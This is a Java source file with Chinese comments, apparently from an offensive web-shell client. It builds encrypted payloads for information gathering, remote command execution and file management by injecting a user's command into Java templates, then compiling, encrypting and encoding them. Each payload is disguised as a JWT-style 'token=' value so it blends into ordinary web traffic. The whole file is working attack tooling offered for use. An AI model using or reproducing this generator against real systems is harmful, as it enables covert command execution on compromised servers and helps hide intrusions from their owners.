package org.nox.tools;

import org.nox.cipher.Cipher;

/**
 * Payload 生成器。
 * 负责读取 Java 模板（Info.txt / RCE.txt），将用户命令注入模板后，
 * 调用 Transformer 进行编译、压缩、加密和 Base64 编码，最终生成完整的 token 格式 Payload。
 */
public class PayloadGenerater {
    // 从配置文件中读取的加解密密钥
    static String xorKey = PropertiesUtil.get("xorKey");
    static String aesKey = PropertiesUtil.get("aesKey");
    static String aesIv = PropertiesUtil.get("aesIv");

    /**
     * 根据模式生成对应的加密 Payload。
     * @param mode 0=信息收集模式，1=远程命令执行模式
     * @param cmd  用户输入的命令（mode=1 时使用）
     * @return 完整的 token 格式字符串
     * @throws Exception 加密或编译过程中的异常
     */
    public static String generate(int mode, String cmd) throws Exception {
        if (mode == 0) {
            // 信息收集模式：读取 Info.txt 模板，无需注入命令
            String template = TemplateUtil.readTemplate("/JavaTemplates/Info.txt");
            String payload = "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
                    + Transformer.transform(template, xorKey, aesKey, aesIv)
                    + "." + Cipher.generateRandom(43);
            return payload;
        } else if (mode == 1) {
            // RCE 模式：读取 RCE.txt 模板，将命令注入模板中的 {} 占位符
            String template = TemplateUtil.readTemplate("/JavaTemplates/RCE.txt");
            // 对命令中的反斜杠和双引号进行 Java 字符串转义，防止编译报错
            String payload = template.replace("{}", escapeJavaString(cmd));
            payload = "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
                    + Transformer.transform(payload, xorKey, aesKey, aesIv)
                    + "." + Cipher.generateRandom(43);
            return payload;
        } else if (mode == 2) {
            // 文件管理模式：读取 FileManager.txt 模板，将命令注入模板中的 {} 占位符
            String template = TemplateUtil.readTemplate("/JavaTemplates/FileManager.txt");
            String payload = template.replace("{}", escapeJavaString(cmd));
            payload = "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
                    + Transformer.transform(payload, xorKey, aesKey, aesIv)
                    + "." + Cipher.generateRandom(43);
            return payload;
        }
        return "";
    }

    /**
     * 对字符串进行 Java 字符串字面量转义。
     * 将反斜杠替换为双反斜杠，双引号替换为转义双引号，防止注入模板后 javac 编译失败。
     * @param s 原始字符串
     * @return 转义后的字符串
     */
    private static String escapeJavaString(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }
}
